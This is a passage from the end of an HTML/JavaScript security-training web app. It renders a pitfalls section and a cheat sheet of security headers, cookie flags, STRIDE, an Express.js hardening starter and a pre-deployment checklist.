  if(state.quizAnswers[qi])return;
  const correct=oi===quizQuestions[qi].correct;
  state.quizAnswers[qi]={selected:oi,correct};
  if(correct){addXP(15);markDone('quiz_'+qi);}
  renderContent();
  document.getElementById('quiz-'+qi).scrollIntoView({behavior:'smooth',block:'center'});
}

function renderPitfalls(main){
  main.innerHTML=`
    <h1>‚ö†Ô∏è Common Mistakes & Pitfalls</h1>
    <p class="subtitle">${pitfalls.length} critical security mistakes JavaScript developers make</p>
    <div class="card card-warn">
      <div class="card-title">üö® Study These Carefully</div>
      <p>These are the most common security mistakes found in code reviews and audits. Interviewers love asking about these!</p>
    </div>
    ${pitfalls.map((p,i)=>renderPitfall(p,i)).join('')}
  `;
}

function renderPitfall(p, i){
  return `
    <div class="collapsible ${state.exerciseResults['pit_'+i]?'open':''}" id="pitfall-${i}">
      <div class="collapsible-header" onclick="togglePitfall(${i})">
        <span>
          <span class="tag tag-${p.severity==='CRITICAL'?'red':p.severity==='HIGH'?'amber':'blue'}" style="margin-right:8px">${p.severity}</span>
          ${p.title}
        </span>
        <span>${state.exerciseResults['pit_'+i]?'‚ñº':'‚ñ∂'}</span>
      </div>
      <div class="collapsible-body">
        <p>${p.explanation}</p>
        <div class="vs-grid">
          <div class="vs-card vs-bad">
            <h4>‚ùå Wrong</h4>
            <pre><code>${escapeHtml(p.wrong)}</code></pre>
          </div>
          <div class="vs-card vs-good">
            <h4>‚úÖ Right</h4>
            <pre><code>${escapeHtml(p.right)}</code></pre>
          </div>
        </div>
      </div>
    </div>
  `;
}

function togglePitfall(i){
  state.exerciseResults['pit_'+i]=!state.exerciseResults['pit_'+i];
  const el=document.getElementById('pitfall-'+i);
  el.classList.toggle('open');
}

function renderCheatSheet(main){
  main.innerHTML=`
    <h1>üìã Security Cheat Sheet</h1>
    <p class="subtitle">Quick reference for JavaScript security ‚Äî bookmark this!</p>
    
    <h2>üîí Security Headers</h2>
    <table>
      <tr><th>Header</th><th>Recommended Value</th><th>Purpose</th></tr>
      ${cheatSheet.headers.map(h=>`
        <tr>
          <td><code style="color:var(--accent)">${h.name}</code></td>
          <td><code style="font-size:11px">${escapeHtml(h.value)}</code></td>
          <td>${h.purpose}</td>
        </tr>
      `).join('')}
    </table>

    <h2>üç™ Cookie Security Flags</h2>
    <table>
      <tr><th>Flag</th><th>Purpose</th></tr>
      ${cheatSheet.cookieFlags.map(c=>`
        <tr><td><code>${c.flag}</code></td><td>${c.purpose}</td></tr>
      `).join('')}
    </table>

    <h2>üî† STRIDE Quick Reference</h2>
    <table>
      <tr><th></th><th>Threat</th><th>Security Property</th><th>Ask Yourself</th></tr>
      ${cheatSheet.stride.map(s=>`
        <tr>
          <td><strong style="color:var(--accent);font-size:18px">${s.letter}</strong></td>
          <td><strong>${s.name}</strong></td>
          <td>${s.property}</td>
          <td style="font-style:italic;color:var(--text2)">${s.question}</td>
        </tr>
      `).join('')}
    </table>

    <h2>‚ö° Quick Fix Reference</h2>
    <table>
      <tr><th>Vulnerability</th><th>Fix</th></tr>
      ${cheatSheet.quickFixes.map(q=>`
        <tr><td><strong>${q.vuln}</strong></td><td><code>${q.fix}</code></td></tr>
      `).join('')}
    </table>

    <h2>üõ°Ô∏è Express.js Security Starter</h2>
    <pre><code><span class="cmt">// Copy-paste security starter for Express apps</span>
<span class="kw">const</span> express = require(<span class="str">'express'</span>);
<span class="kw">const</span> helmet = require(<span class="str">'helmet'</span>);
<span class="kw">const</span> rateLimit = require(<span class="str">'express-rate-limit'</span>);
<span class="kw">const</span> cors = require(<span class="str">'cors'</span>);

<span class="kw">const</span> app = express();

<span class="cmt">// 1. Security headers</span>
app.use(helmet());

<span class="cmt">// 2. Rate limiting</span>
app.use(rateLimit({ windowMs: <span class="num">15</span>*<span class="num">60</span>*<span class="num">1000</span>, max: <span class="num">100</span> }));

<span class="cmt">// 3. CORS</span>
app.use(cors({ origin: <span class="str">'https://myapp.com'</span>, credentials: <span class="kw">true</span> }));

<span class="cmt">// 4. Body parsing with limits</span>
app.use(express.json({ limit: <span class="str">'10kb'</span> }));

<span class="cmt">// 5. Remove fingerprinting headers</span>
app.disable(<span class="str">'x-powered-by'</span>);

<span class="cmt">// 6. Secure cookie config</span>
app.use(session({
  cookie: {
    secure: <span class="kw">true</span>,
    httpOnly: <span class="kw">true</span>,
    sameSite: <span class="str">'strict'</span>,
    maxAge: <span class="num">900000</span>
  }
}));

<span class="cmt">// 7. Error handler (no stack traces)</span>
app.use((err, req, res, next) => {
  console.error(err);
  res.status(<span class="num">500</span>).json({ error: <span class="str">'Internal error'</span> });
});</code></pre>

    <h2>‚úÖ Pre-Deployment Checklist</h2>
    <div class="checklist">
      <label><input type="checkbox"> All user input validated server-side</label>
      <label><input type="checkbox"> Parameterized queries for all DB operations</label>
      <label><input type="checkbox"> Output encoding based on context</label>
      <label><input type="checkbox"> Security headers set (CSP, HSTS, etc.)</label>
      <label><input type="checkbox"> Cookies have HttpOnly, Secure, SameSite</label>
      <label><input type="checkbox"> CORS properly restricted</label>
      <label><input type="checkbox"> Rate limiting on auth & API endpoints</label>
      <label><input type="checkbox"> JWT verify() with algorithm whitelist</label>
      <label><input type="checkbox"> No secrets in frontend code</label>
      <label><input type="checkbox"> npm audit shows no high/critical issues</label>
      <label><input type="checkbox"> Error messages don't leak internals</label>
      <label><input type="checkbox"> Logging doesn't contain sensitive data</label>
      <label><input type="checkbox"> File uploads validated and stored safely</label>
      <label><input type="checkbox"> Redirects validated against whitelist</label>
      <label><input type="checkbox"> HTTPS enforced everywhere</label>
      <label><input type="checkbox"> Auth failures use generic messages</label>
      <label><input type="checkbox"> Admin endpoints have authorization checks</label>
      <label><input type="checkbox"> Crypto uses secure randomness, not Math.random()</label>
    </div>

    <h2>üìö Resources</h2>
    <div class="grid-2">
      <div class="card">
        <div class="card-title">üìñ OWASP</div>
        <p style="font-size:13px">owasp.org ‚Äî Top 10, Testing Guide, Cheat Sheets</p>
      </div>
      <div class="card">
        <div class="card-title">üßÉ Juice Shop</div>
        <p style="font-size:13px">Practice hacking a real Node.js app legally</p>
      </div>
      <div class="card">
        <div class="card-title">üî¨ PortSwigger Academy</div>
        <p style="font-size:13px">Free web security labs ‚Äî excellent for practice</p>
      </div>
      <div class="card">
        <div class="card-title">üìä SecurityHeaders.com</div>
        <p style="font-size:13px">Test your site's security headers instantly</p>
      </div>
    </div>
  `;
}

function escapeHtml(str){
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// ============================================================
// INIT
// ============================================================
function init(){
  renderSidebar();
  renderContent();
}

init();
</script>
</body>
</html>